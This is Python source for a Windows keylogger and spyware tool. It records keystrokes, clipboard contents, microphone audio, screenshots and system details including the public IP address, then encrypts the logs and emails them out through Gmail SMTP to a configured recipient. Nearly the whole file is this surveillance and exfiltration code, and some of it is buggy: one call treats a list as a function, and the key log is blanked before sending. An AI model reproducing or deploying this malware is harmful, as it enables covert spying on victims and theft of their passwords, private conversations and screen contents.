from email.mime.multipart import MIMEMultipart #for emails
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtpd
import smtplib


import socket #for Sockets and networking
import platform

import win32clipboard #logging/listening
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write #for microhone
import sounddevice as sd

from cryptography.fernet import Fernet #for encryption

import getpass
from requests import get #for HTTP

from multiprocessing import Process, freeze_support
from PIL import ImageGrab #get screenshots


keyInfoFile = "key_log.log" #Logger Info File
systemInfoFile = "systemInfo.log" #System info file
clipboardInfoFile = "clipboardInfo.log" #clipboard Info File
micDataFile = "micData.wav" #Audio Recording File
screenshotDataFile = "screenshot.png" #Screenshot File

filePath = ""
extend = "\\"
fileMerge = filePath + extend

keyInfoFile_e = "e_key_log.log"
systemInfoFile_e = "e_systemInfo.log"
clipboardInfoFile_e = "e_clipboardInfo.log"

micTime = 10
timeIteration = 10

#Credentials
emailID = ""
emailPassword = ""
toAddr = ""
key = ""

#Features Function
def sendEmail(filename, attachment, toAddr):
    fromAddr = emailID
    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Log File"
    body = "Body of the Mail"
    
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddr, emailPassword)

    text = msg.as_string()

    s.sendmail(fromAddr, toAddr, text)
    s.quit()


def computerInfo():
    with open(filePath + extend +systemInfoFile, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP + '\n')
        
        except Exception:
            f.write("Couldn't get Public IP Address")
        
        f.write("Processor Information: " + (platform.processor())+ '\n')
        f.write("System Information: " + (platform.system()) + " " + platform.version() + '\n')
        f.write("Machine Information: " + (platform.machine())+ '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computerInfo()


def clipboard():
    with open(filePath + extend + clipboardInfoFile, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pastedData)
        
        except:
            f.write("Clipboard could not be coppied")


def micData():
    fs = 44100 #frequency
    seconds = micTime

    myRecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    
    write(filePath + extend + micDataFile, fs, myRecording)
micData()


def screenshot():
    im = ImageGrab.grab()
    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Add a timestamp to avoid overwriting
    im.save(filePath + extend + f"screenshot_{timestamp}.png")
    time.sleep(10)
screenshot()


#Key Logging
numOfIterationsEnd = 5
numOfIterations = 0
currentTime = time.time()
stoppingTime = time.time() + timeIteration

while numOfIterations < numOfIterationsEnd:
    count = 0
    keys = []

    def onPress(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeFile(keys)
            keys = []


    def writeFile(keys):
        with open(filePath + extend + keyInfoFile, "a") as logFile:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    logFile.write('\n')
                    logFile.close()

                elif k.find("Key") == -1:
                    logFile.write(k)
                    logFile.close()                


    def onRelease(key):
        if key == Key.esc:
            return False
        
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(filePath + extend + keyInfoFile, 'w') as f:
            f.write(" ")
            
        sendEmail(keyInfoFile, filePath + extend + keyInfoFile, toAddr)
        clipboard()
        numOfIterations += 1
        
        currentTime = time.time()
        stoppingTime = time.time() + timeIteration


filesToEncrypt = [fileMerge + systemInfoFile, fileMerge + clipboardInfoFile, fileMerge + keyInfoFile]
encryptedFileNames = [fileMerge + systemInfoFile_e, fileMerge + clipboardInfoFile_e, fileMerge + keyInfoFile_e]

count = 0

for encryptingFile in filesToEncrypt:
    with open(filesToEncrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encryptedFileNames[count], 'wb') as f:
        f.write(encrypted)
    
    sendEmail(encryptedFileNames(count), encryptedFileNames[count], toAddr)
    count += 1

time.sleep(120)